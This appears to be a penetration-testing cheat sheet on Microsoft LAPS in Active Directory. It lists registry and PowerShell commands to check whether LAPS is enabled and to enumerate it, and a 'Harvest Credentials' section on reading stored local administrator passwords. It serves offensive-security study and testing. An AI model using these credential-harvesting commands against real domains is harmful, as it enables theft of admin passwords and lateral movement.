# Living off the Land

## 01 - Enumerate

Check the registry entry if LAPS is enabled.

```
C:\> reg.exe query "HKLM\SOFTWARE\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

PS C:\> Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -Name "AdmPwdEnabled"
```

Check if that folder exists and contains `AdmPwd.dll`.

```
C:\> dir "C:\Program Files\LAPS\CSE"

PS C:\> Get-ChildItem -Path "C:\Program Files\LAPS\CSE"
```

Enumerate native LAPS PowerShell cmdlets if they are installed.

```
PS C:\> Get-Command *AdmPwd*
```

## 02 - Harvest Credentials

Find the principals that have **ReadProperty** on `ms-Mcs-AdmPwd`.

```
PS C:\> Get-AdmPwdPassword -ComputerName <IP> | Format-List
```

Find GPOs that have "LAPS" or some other descriptive term in the name

```
PS C:\> Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | Format-List
```

Search computer objects where the `ms-Mcs-AdmPwdExpirationTime` property is not null (any Domain User can read this property)

```
PS C:\> Get-DomainObject -SearchBase "LDAP://[DC=<subdomain>,]DC=<domain>,DC=<tld>" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```

---
## References

### Hacktricks

- [Hacktricks: LAPS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

### ADSecurity

- [ADSecurity: Microsoft Local Administrator Password Solution (LAPS)](https://adsecurity.org/?p=1790)

### Hacking Articles

- [Hacking Articles: Credential Dumping - LAPS](https://www.hackingarticles.in/credential-dumpinglaps/)

### ExploitDB

- [Exploit DB: Abusing LAPS](https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf)